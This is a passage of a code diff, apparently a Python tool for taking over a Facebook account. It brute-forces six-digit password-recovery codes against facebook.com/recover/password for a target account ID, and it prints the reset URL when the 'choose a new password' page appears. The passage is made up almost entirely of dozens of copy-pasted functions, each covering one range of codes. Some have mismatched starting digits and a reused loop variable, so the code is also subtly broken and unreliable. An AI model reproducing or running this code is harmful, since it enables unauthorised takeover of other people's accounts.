+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k3():
+    a=3
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (380000,390000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()    
+def task_j3():
+    a=3
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (390000,400000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_a4():
+    a=4
+    b=0
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (400000,410000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b4():
+    a=4
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (410000,420000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f4():
+    a=4
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (420000,430000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c4():
+    a=4
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (430000,440000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d4():
+    a=4
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (440000,450000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e4():
+    a=4
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (450000,460000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g4():
+    a=4
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (460000,470000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h4():
+    a=4
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (470000,480000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k4():
+    a=4
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (480000,490000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()    
+def task_j4():
+    a=4
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (490000,500000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_a5():
+    a=5
+    b=0
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (500000,510000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b5():
+    a=5
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (510000,520000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f5():
+    a=1
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (520000,530000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c5():
+    a=5
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (530000,540000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d5():
+    a=1
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (540000,550000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e5():
+    a=5
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (550000,560000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g5():
+    a=5
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (560000,570000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h5():
+    a=5
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (570000,580000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k5():
+    a=5
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (580000,590000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()    
+def task_j5():
+    a=5
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (590000,600000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_a6():
+    a=6
+    b=0
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (600000,610000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b6():
+    a=6
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (610000,620000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f6():
+    a=6
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (620000,630000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c6():
+    a=6
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (630000,640000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d6():
+    a=6
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (640000,650000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_e6():
+    a=6
+    b=5
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (650000,660000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_g6():
+    a=6
+    b=6
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (660000,670000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_h6():
+    a=6
+    b=7
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (670000,680000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_k6():
+    a=6
+    b=8
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (680000,690000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()    
+def task_j6():
+    a=6
+    b=9
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (690000,700000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_a7():
+    a=7
+    b=0
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (700000,710000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_b7():
+    a=7
+    b=1
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (710000,720000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_f7():
+    a=7
+    b=2
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (720000,730000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_c7():
+    a=7
+    b=3
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (730000,740000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
+            url=f'https://www.facebook.com/recover/password/?u={id_account}&n={recover_pass}&fl=default_recover&sih=0&msgr=0'
+            sp=requests.get(url,timeout=10).text
+            html=BeautifulSoup(sp,"html.parser")
+            html=html.find('h2',{'class':"accessible_elem"})
+            if html.getText()==('Chọn mật khẩu mới'):
+                print (url)
+                quit()
+def task_d7():
+    a=7
+    b=4
+    c=0
+    d=0
+    e=0
+    f=0
+    for f in range (740000,750000):
+        for f in range (0,10):
+            f=f+1
+            if f==10:
+                f=0
+                e=e+1
+                if e==10:
+                    e=0
+                    d=d+1
+                    if d==10:
+                        d=0
+                        c=c+1
+                        if c==10:
+                            c=0
+                            b=b+1
+                            if b==10:
+                                b=0
+                                a=a+1
+            recover_pass=str(a)+str(b)+str(c)+str(d)+str(e)+str(f)
